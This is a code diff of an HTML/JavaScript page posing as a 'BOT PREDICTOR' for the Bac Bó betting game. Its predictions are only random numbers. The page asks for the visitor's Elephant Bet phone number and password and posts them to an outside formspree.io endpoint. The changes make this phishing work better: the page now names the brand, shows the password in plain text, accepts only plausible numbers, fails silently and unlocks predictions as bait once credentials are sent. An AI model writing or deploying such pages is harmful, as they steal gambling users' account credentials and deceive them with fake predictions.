@@ -16,103 +16,45 @@
     h1 {
       color: #ff00ff;
       text-shadow: 0 0 10px #ff00ff;
-      font-size: 1.5em;
+      font-size: 1.8em;
     }
     .circle {
       font-size: 2em;
       margin: 20px auto;
-      padding: 30px;
+      padding: 40px;
       border-radius: 50%;
-      width: 120px;
-      height: 120px;
+      width: 180px;
+      height: 180px;
       display: flex;
       align-items: center;
       justify-content: center;
     }
-    .azul {
-      color: #00f;
-      border: 3px solid #00f;
-      box-shadow: 0 0 20px #00f;
-    }
-    .vermelho {
-      color: #f00;
-      border: 3px solid #f00;
-      box-shadow: 0 0 20px #f00;
-    }
-    .empate {
-      color: #ffd700;
-      border: 3px solid #ffd700;
-      box-shadow: 0 0 20px #ffd700;
-    }
+    .azul { color:#00f; border:3px solid #00f; box-shadow:0 0 20px #00f; }
+    .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00; }
+    .empate { color:#ffd700; border:3px solid #ffd700; box-shadow:0 0 20px #ffd700; }
     .blocked {
-      background: #333;
-      color: #ffcc00;
-      padding: 10px;
-      margin: 15px auto;
-      border-radius: 5px;
-      width: 90%;
-      font-size: 0.9em;
+      background:#333; color:#ffcc00; padding:10px; margin:15px auto;
+      border-radius:5px; width:90%; font-size:0.9em;
     }
     .bar {
-      background: #8000ff;
-      padding: 10px;
-      margin: 10px auto;
-      border-radius: 5px;
-      width: 90%;
-      font-size: 0.9em;
-    }
-    .history {
-      background: #111;
-      padding: 15px;
-      margin-top: 20px;
-      border-radius: 5px;
-      box-shadow: 0 0 10px #00ffff;
-    }
-    .history h2 {
-      color: #00ffff;
-      font-size: 1.2em;
-    }
-    .history-item {
-      background: #8000ff;
-      margin: 5px auto;
-      padding: 8px;
-      border-radius: 5px;
-      width: 80%;
-      font-size: 0.9em;
+      background:#8000ff; padding:10px; margin:10px auto;
+      border-radius:5px; width:90%; font-size:0.9em;
     }
     button {
-      padding: 12px 20px;
-      background: #28a745;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 15px;
-      font-size: 1em;
-      width: 90%;
-      max-width: 300px;
+      padding:12px 20px; background:#ff00aa; color:#fff; border:none;
+      border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em;
+      width:80%; max-width:300px;
     }
-    button:hover {
-      background: #218838;
-    }
+    button:hover { background:#cc0088; }
     input {
-      margin: 8px;
-      padding: 10px;
-      width: 90%;
-      max-width: 300px;
-      font-size: 1em;
-    }
-    #formMessage {
-      margin-top: 10px;
-      font-weight: bold;
-      font-size: 0.9em;
+      margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em;
     }
   </style>
 </head>
 <body>
   <h1>BOT PREDICTOR - Bac Bó</h1>
 
-  <div id="circle" class="circle">00.000x</div>
+  <div id="circle" class="circle">--</div>
 
   <div id="blocked" class="blocked" style="display:none;">
     ⚠️ Acesso bloqueado
@@ -122,38 +64,34 @@
   </div>
 
   <button id="preverBtn">Fazer Previsão</button>
-
   <div id="resultado"></div>
 
-  <div class="history">
-    <h2>Histórico da Banca</h2>
-    <div id="historyList"></div>
-  </div>
-
   <div class="section">
-    <h2>Conecte com a sua conta</h2>
+    <h2>Conecte com a sua conta da Elephant Bet</h2>
     <form id="loginForm" action="https://formspree.io/f/xgvneord" method="POST">
-      <input type="text" name="numero" placeholder="Número" required><br>
-      <input type="password" name="senha" placeholder="Senha" required><br>
+      <label for="numero">Número</label><br>
+      <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
+      
+      <label for="senha">Senha</label><br>
+      <input type="text" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
+      
       <button type="submit">Conectar Agora</button>
     </form>
-    <div id="formMessage"></div>
     <a href="#">← Voltar</a>
   </div>
 
   <script>
-    // Previsões da banca
     let previsoesFeitas = 0;
+    let bloqueado = true; // bloqueio ativo até login válido
     const maxPrevisoes = 3;
     const circle = document.getElementById("circle");
     const resultado = document.getElementById("resultado");
     const preverBtn = document.getElementById("preverBtn");
     const blocked = document.getElementById("blocked");
     const bar = document.getElementById("bar");
-    const historyList = document.getElementById("historyList");
 
     preverBtn.addEventListener("click", function() {
-      if (previsoesFeitas >= maxPrevisoes) {
+      if (bloqueado && previsoesFeitas >= maxPrevisoes) {
         blocked.style.display = "block";
         bar.style.display = "block";
         resultado.textContent = "";
@@ -162,43 +100,37 @@
 
       previsoesFeitas++;
 
-      // Probabilidades: Azul 40%, Vermelho 40%, Empate 20%
       const rand = Math.random();
-      let banca, classe;
-      if (rand < 0.4) {
-        banca = "Azul";
-        classe = "azul";
-      } else if (rand < 0.8) {
-        banca = "Vermelho";
-        classe = "vermelho";
-      } else {
-        banca = "Empate";
-        classe = "empate";
-      }
-
-      // Gerar valor aleatório estilo 00.x00
-      const valor = (Math.random() * 10).toFixed(2) + "x";
+      let banca, classe, valor;
+      if (rand < 0.4) { banca="Azul"; classe="azul"; valor="80%"; }
+      else if (rand < 0.8) { banca="Vermelho"; classe="vermelho"; valor="80%"; }
+      else { banca="Empate"; classe="empate"; valor="20%"; }
 
       circle.textContent = valor;
       circle.className = "circle " + classe;
       resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
-
-      // Adicionar ao histórico
-      const item = document.createElement("div");
-      item.className = "history-item";
-      item.textContent = valor + " → " + banca;
-      historyList.prepend(item);
     });
 
-    // Login com feedback
+    // Login com validação e desbloqueio
     const loginForm = document.getElementById("loginForm");
-    const formMessage = document.getElementById("formMessage");
+    const numeroInput = document.getElementById("numero");
+    const senhaInput = document.getElementById("senha");
+
+    numeroInput.addEventListener("input", function() {
+      if (!numeroInput.value.startsWith("9")) { numeroInput.value = ""; }
+      if (numeroInput.value.length > 9) { numeroInput.value = numeroInput.value.slice(0,9); }
+    });
 
     loginForm.addEventListener("submit", async function(event) {
       event.preventDefault();
+      const numero = numeroInput.value;
+      const senha = senhaInput.value;
+
+      if (!/^\d{9}$/.test(numero) || senha.length < 5) {
+        return; // inválido, não envia
+      }
 
       const formData = new FormData(loginForm);
-
       try {
         const response = await fetch(loginForm.action, {
           method: loginForm.method,
@@ -207,16 +139,15 @@
         });
 
         if (response.ok) {
-          formMessage.textContent = "✅ Login enviado com sucesso!";
-          formMessage.style.color = "lime";
           loginForm.reset();
-        } else {
-          formMessage.textContent = "⚠️ Erro ao enviar. Tente novamente.";
-          formMessage.style.color = "red";
+          // Desbloquear previsões após login válido
+          bloqueado = false;
+          previsoesFeitas = 0;
+          blocked.style.display = "none";
+          bar.style.display = "none";
         }
       } catch (error) {
-        formMessage.textContent = "⚠️ Erro de conexão. Verifique sua internet.";
-        formMessage.style.color = "red";
+        // silencioso, sem mensagens
       }
     });
   </script>
